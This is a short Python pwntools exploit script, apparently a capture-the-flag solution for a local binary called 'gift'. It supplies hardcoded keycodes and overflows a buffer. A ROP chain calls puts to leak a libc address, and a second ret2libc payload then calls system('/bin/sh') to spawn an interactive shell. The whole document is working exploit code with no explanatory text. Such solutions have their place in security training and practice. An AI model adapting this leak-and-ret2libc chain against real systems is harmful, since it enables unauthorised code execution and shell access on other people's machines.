#!/usr/bin/python

from pwn import *
import struct

keycodes = [6419804, 7048451, 1, 5981939, 1809240, 3891630, 1, 2807850, 4265200, 4512418, 1, 5061300, 1303193, 7616025, 1, 6084938]


elf = context.binary = ELF("./gift")
#context.log_level = 'debug'

io = process(elf.path)

offset_eip = 16	# calculated previously

#####

puts_plt = p32(0x08048450)  # address of puts@PLT
pop_ebx  = p32(0x080483f1)  # address of pop ebx; ret;
got_puts = p32(0x0804d01c)  # address of puts@GOT
win      = p32(0x08048703)  # address of win()

# construct shellcode
code  = "A"*offset_eip
code += puts_plt
code += pop_ebx
code += got_puts
code += win

io = process(elf.path)
io.recvuntil(" > ")
io.sendline("666")

for x in range(16):
    io.recvuntil("Enter keycode %d: "%x)
    io.sendline(str(keycodes[x]))

print io.recv(4096)

io.sendline(code)

addr = struct.unpack("I", io.read(4))[0]
print "address of puts: 0x%x"%addr

print io.recv(4096)



## second shellcode

offset_system = -0x24d40
offset_exit   = -0x31090
offset_binsh  = 0xfd548

code = "A"*offset_eip
code += p32(addr + offset_system)
code += p32(addr + offset_exit)
code += p32(addr + offset_binsh)


io.sendline(code)
io.interactive()
